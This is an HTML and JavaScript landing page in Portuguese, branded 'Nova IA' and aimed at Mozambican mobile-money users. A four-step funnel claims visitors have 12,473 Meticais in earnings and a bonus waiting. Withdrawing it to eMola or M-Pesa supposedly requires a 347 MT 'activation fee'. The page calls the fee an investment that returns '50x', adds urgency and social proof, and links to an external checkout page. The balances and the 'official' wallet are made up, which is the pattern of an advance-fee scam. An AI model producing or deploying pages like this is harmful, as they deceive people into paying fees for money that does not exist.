<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
<title>Nova IA | Ativação de Carteira</title>

<!-- Font Awesome para ícones modernos -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
  font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
}

body{
  background: #000000;
  min-height: 100vh;c
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  overflow-x: hidden;
  padding: 24px 16px;
}

/* Efeito Liquid Glass */
body::before {
  content: '';
  position: fixed;
  top: -50%;
  left: -50%;
  width: 200%;
  height: 200%;
  background: radial-gradient(circle at 30% 50%, rgba(255, 255, 255, 0.03) 0%, transparent 50%),
              radial-gradient(circle at 70% 80%, rgba(255, 255, 255, 0.03) 0%, transparent 50%),
              radial-gradient(circle at 10% 20%, rgba(255, 255, 255, 0.02) 0%, transparent 50%);
  animation: liquidMove 20s ease-in-out infinite alternate;
  pointer-events: none;
  z-index: 0;
}

@keyframes liquidMove {
  0% { transform: rotate(0deg) scale(1); }
  100% { transform: rotate(5deg) scale(1.1); }
}

.wrapper{
  width:100%;
  max-width: 480px;
  position: relative;
  z-index: 1;
}

/* Logo */
.logo{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:12px;
  margin-bottom:18px;
  animation: fadeSlideUp 0.4s ease-out;
}

.logo-mark{
  width: 56px;
  height: 56px;
  border-radius: 16px;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:800;
  font-size:28px;
  backdrop-filter: blur(10px);
}

.logo-text{
  font-size: 20px;
  font-weight: 800;
  letter-spacing: -0.3px;
  background: linear-gradient(135deg, #fff, #fbbf24);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

/* progresso */
.progress-wrap{
  margin-bottom: 22px;
  animation: fadeSlideUp 0.4s ease-out 0.05s both;
}

.progress-meta{
  display:flex;
  justify-content:space-between;
  align-items:center;
  font-size:12px;
  color: rgba(255, 255, 255, 0.6);
  margin-bottom:8px;
}

.progress{
  width:100%;
  height: 6px;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 3px;
  overflow:hidden;
}

.progress-fill{
  height:100%;
  width:25%;
  border-radius: 3px;
  background: linear-gradient(90deg, #fbbf24, #f59e0b);
  transition:width .35s ease;
}

/* cartão principal - Liquid Glass */
.card{
  background: rgba(255, 255, 255, 0.03);
  backdrop-filter: blur(20px);
  -webkit-backdrop-filter: blur(20px);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 28px;
  padding: 24px 20px 28px;
  box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
  position: relative;
  overflow: hidden;
  animation: fadeSlideUp 0.4s ease-out 0.1s both;
}

.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.03), transparent);
  animation: shine 8s infinite;
  pointer-events: none;
}

@keyframes shine {
  0% { left: -100%; }
  20% { left: 100%; }
  100% { left: 100%; }
}

.content{
  animation:fadeStep .22s ease;
  position: relative;
  z-index: 1;
}

@keyframes fadeStep{
  from{opacity:0;transform:translateY(8px)}
  to{opacity:1;transform:translateY(0)}
}

@keyframes fadeSlideUp {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

/* ícone */
.icon-box{
  width: 70px;
  height: 70px;
  margin:0 auto 18px;
  border-radius: 20px;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  display:flex;
  align-items:center;
  justify-content:center;
}

.icon-box i{
  font-size: 34px;
  color: #fbbf24;
}

/* títulos gerais */
.title{
  font-size: 18px;
  line-height:1.35;
  font-weight:800;
  text-align:center;
  margin-bottom: 18px;
  color: white;
}

.desc{
  font-size: 14px;
  line-height:1.65;
  color: rgba(255, 255, 255, 0.7);
  text-align:center;
}

.desc strong{
  color: #fbbf24;
  font-weight:800;
}

/* botoes gerais */
.buttons{
  display:flex;
  gap:12px;
  margin-top: 20px;
}

.btn{
  appearance:none;
  border:none;
  cursor:pointer;
  border-radius: 50px;
  min-height: 56px;
  font-size: 15px;
  font-weight:800;
  transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
  flex:1;
}

.btn:active{
  transform:scale(.97);
}

.btn-yellow{
  background: linear-gradient(135deg, #fbbf24, #f59e0b);
  color: #000;
  box-shadow: 0 10px 22px rgba(251, 191, 36, 0.25);
}

.btn-green{
  background: rgba(34, 197, 94, 0.2);
  border: 1px solid rgba(34, 197, 94, 0.4);
  color: #4ade80;
}

.btn-full{
  width:100%;
  background: linear-gradient(135deg, #fbbf24, #f59e0b);
  color: #000;
  min-height: 56px;
  border-radius: 50px;
  font-size: 16px;
  font-weight:900;
  border: none;
  cursor: pointer;
  transition: all 0.2s;
}

.btn-full:active{
  transform:scale(.97);
}

/* etapa 2 aviso */
.notice{
  margin: 20px 0 18px;
  padding: 14px 16px;
  border-radius: 16px;
  border: 1px solid rgba(251, 191, 36, 0.3);
  background: rgba(251, 191, 36, 0.08);
  text-align:center;
  color: #fbbf24;
  font-size: 13px;
  line-height:1.5;
  font-weight:700;
}

/* etapa 4 específica */
.step4-title{
  font-size: 20px;
  line-height:1.3;
  font-weight:800;
  text-align:center;
  margin-bottom: 16px;
  color: white;
}

.step4-desc{
  text-align:center;
  color: rgba(255, 255, 255, 0.7);
  font-size: 14px;
  line-height:1.6;
  margin-bottom: 20px;
}

.step4-desc strong{
  color: #fbbf24;
}

.info-box{
  background: rgba(251, 191, 36, 0.05);
  border: 1px solid rgba(251, 191, 36, 0.2);
  border-radius: 20px;
  padding: 16px;
  margin-bottom: 18px;
  text-align:left;
}

.info-title{
  color: #fbbf24;
  font-size: 15px;
  font-weight:800;
  margin-bottom: 12px;
  display:flex;
  align-items:center;
  gap:8px;
}

.info-box p{
  color: rgba(255, 255, 255, 0.7);
  font-size: 13px;
  line-height:1.55;
  margin-bottom: 10px;
}

.info-box p strong{
  color: white;
  font-weight:800;
}

.info-box p .money-green{
  color: #4ade80;
  font-weight:800;
}

.info-box p:last-child{
  margin-bottom:0;
}

.amount-card{
  display:flex;
  align-items:center;
  gap:12px;
  border-radius: 18px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.1);
  padding: 14px;
  margin-bottom: 12px;
  transition: all 0.3s ease;
}

.amount-card:hover {
  background: rgba(255, 255, 255, 0.05);
  transform: translateX(3px);
}

.amount-card i{
  font-size: 24px;
  width: 28px;
  text-align: center;
}

.amount-text{
  flex:1;
  text-align:left;
}

.amount-label{
  font-size: 12px;
  color: rgba(255, 255, 255, 0.6);
  font-weight:600;
  margin-bottom: 4px;
}

.amount-value{
  font-size: 18px;
  font-weight:900;
  letter-spacing:.2px;
}

.amount-value.gold{
  color: #fbbf24;
}

.amount-value.green{
  color: #4ade80;
}

.amount-card.total{
  border: 1px solid rgba(251, 191, 36, 0.4);
  background: rgba(251, 191, 36, 0.08);
}

.amount-card.total .amount-label{
  color: rgba(255, 255, 255, 0.8);
}

.amount-card.total .amount-value{
  color: #fbbf24;
  font-size: 19px;
}

.bottom-note{
  margin: 8px 0 20px;
  text-align:center;
  color: rgba(255, 255, 255, 0.5);
  font-size: 12px;
  line-height:1.45;
}

.btn-activate{
  width:100%;
  min-height: 56px;
  border:none;
  border-radius: 50px;
  background: linear-gradient(135deg, #fbbf24, #f59e0b);
  color: #000;
  font-size: 17px;
  font-weight:900;
  letter-spacing:.1px;
  cursor:pointer;
  box-shadow: 0 12px 24px rgba(251, 191, 36, 0.25);
  transition: all 0.2s;
}

.btn-activate:active{
  transform:scale(.97);
}

/* responsivo */
@media (max-width: 480px){
  .wrapper{max-width: 100%}
  .card{padding: 20px 16px 24px}
  .buttons{gap:10px}
  .title{font-size: 17px}
  .step4-title{font-size: 18px}
  .icon-box{width: 60px;height: 60px}
  .icon-box i{font-size: 28px}
  .logo-mark{width: 48px;height: 48px;font-size: 24px}
  .logo-text{font-size: 18px}
}

@media (max-width: 380px){
  .card{padding: 18px 14px 22px}
  .title{font-size: 16px}
  .step4-title{font-size: 17px}
  .amount-value{font-size: 16px}
  .amount-card.total .amount-value{font-size: 17px}
  .btn{min-height: 52px;font-size: 14px}
  .btn-full{min-height: 52px;font-size: 15px}
  .btn-activate{min-height: 52px;font-size: 16px}
}
</style>
</head>
<body>

<div class="wrapper">

  <div class="logo">
    <div class="logo-text">NOVA <span>IA</span></div>
  </div>

  <div class="progress-wrap">
    <div class="progress-meta">
      <span id="stepText"></i> Passo 1 de 4</span>
      <span id="percentText">25%</span>
    </div>
    <div class="progress">
      <div class="progress-fill" id="progressFill"></div>
    </div>
  </div>

  <div class="card">
    <div class="content" id="content"></div>
  </div>

</div>

<script>
let step = 1;

const content = document.getElementById("content");
const progressFill = document.getElementById("progressFill");
const stepText = document.getElementById("stepText");
const percentText = document.getElementById("percentText");

function setProgress() {
  const percent = step * 25;
  progressFill.style.width = percent + "%";
  stepText.innerHTML = `</i> Passo ${step} de 4`;
  percentText.textContent = `${percent}%`;
}

function iconPhone() {
  return `
    <div class="icon-box">
      <i class="fas fa-mobile-alt"></i>
    </div>
  `;
}

function iconShield() {
  return `
    <div class="icon-box">
      <i class="fas fa-shield-alt"></i>
    </div>
  `;
}

function iconCheck() {
  return `
    <div class="icon-box">
      <i class="fas fa-check-circle" style="color: #4ade80;"></i>
    </div>
  `;
}

function iconWallet() {
  return `
    <div class="icon-box">
      <i class="fas fa-wallet"></i>
    </div>
  `;
}

function render() {
  if (step === 1) {
    content.innerHTML = `
      ${iconPhone()}
      <div class="title">Você já ouviu falar da Carteira E-commerce Internacional?</div>
      <div class="buttons">
        <button class="btn btn-yellow" onclick="nextStep()"><i class="fas fa-check"></i> Sim</button>
        <button class="btn btn-green" onclick="nextStep()"><i class="fas fa-times"></i> Não</button>
      </div>
    `;
    return;
  }

  if (step === 2) {
    content.innerHTML = `
      ${iconShield()}
      <div class="title">O que é a Carteira E-commerce Internacional?</div>
      <div class="desc">
        <i class="fas fa-info-circle"></i> A Carteira E-commerce Internacional é o sistema oficial que permite transferir os valores ganhos pela plataforma da Nova IA directamente para a sua conta eMola ou M-Pesa em Moçambique.
      </div>
      <div class="notice">
        <i class="fas fa-exclamation-triangle"></i> É essencial activar a sua carteira para poder receber os seus ganhos!
      </div>
      <button class="btn-full" onclick="nextStep()"><i class="fas fa-arrow-right"></i> Continuar</button>
    `;
    return;
  }

  if (step === 3) {
    content.innerHTML = `
      ${iconCheck()}
      <div class="title">Você quer activar a Carteira E-commerce Internacional para levantar o dinheiro que ganhou?</div>
      <div class="buttons">
        <button class="btn btn-yellow" onclick="nextStep()"><i class="fas fa-check"></i> Sim</button>
        <button class="btn btn-green" onclick="goStep(1)"><i class="fas fa-undo"></i> Não</button>
      </div>
    `;
    return;
  }

  if (step === 4) {
    content.innerHTML = `
      ${iconWallet()}
      <div class="step4-title">Active a sua Carteira</div>

      <div class="step4-desc">
        Para activar a Carteira E-commerce, é necessário pagar uma
        <strong>taxa única de 347 Meticais.</strong>
      </div>

      <div class="info-box">
        <div class="info-title"><i class="fas fa-bolt"></i> Não penses que estás a perder!</div>

        <p>
          Os <strong>347 MT</strong> são apenas uma taxa de activação —
          <strong>não é um custo, é um investimento.</strong>
          Assim que activares, todo o valor acumulado será enviado directamente para a tua conta.
        </p>

        <p>
          Imagina: pagas <strong>347 MT</strong> e recebes
          <span class="money-green">12 473 MT</span> de volta.
          Isso é <span class="money-green">50x mais</span> do que investiste! 💰
        </p>

        <p>
          <strong>Milhares de moçambicanos já activaram e receberam. Não fiques para trás! 🚀</strong>
        </p>
      </div>

      <div class="amount-card">
        <i class="fas fa-chart-line" style="color: #fbbf24;"></i>
        <div class="amount-text">
          <div class="amount-label">Ganhos acumulados</div>
          <div class="amount-value gold">10 473 MT</div>
        </div>
      </div>

      <div class="amount-card">
        <i class="fas fa-gift" style="color: #4ade80;"></i>
        <div class="amount-text">
          <div class="amount-label">Bónus de primeiro utilizador</div>
          <div class="amount-value green">+ 2 000 MT</div>
        </div>
      </div>

      <div class="amount-card total">
        <i class="fas fa-star" style="color: #fbbf24;"></i>
        <div class="amount-text">
          <div class="amount-label">Total a receber</div>
          <div class="amount-value">12 473 MT</div>
        </div>
      </div>

      <div class="bottom-note">
        <i class="fas fa-lock"></i> O valor será enviado directamente para o seu eMola ou M-Pesa após a activação.
      </div>

      <button class="btn-activate" onclick="window.location.href='https://midnightblue-raven-603831.hostingersite.com/checkouts/carteirae/'"><i class="fas fa-rocket"></i> Quero Activar Agora</button>
    `;
  }
}

function nextStep() {
  if (step < 4) {
    step++;
    setProgress();
    render();
  }
}

function goStep(n) {
  step = n;
  setProgress();
  render();
}

setProgress();
render();
</script>

</body>
</html>
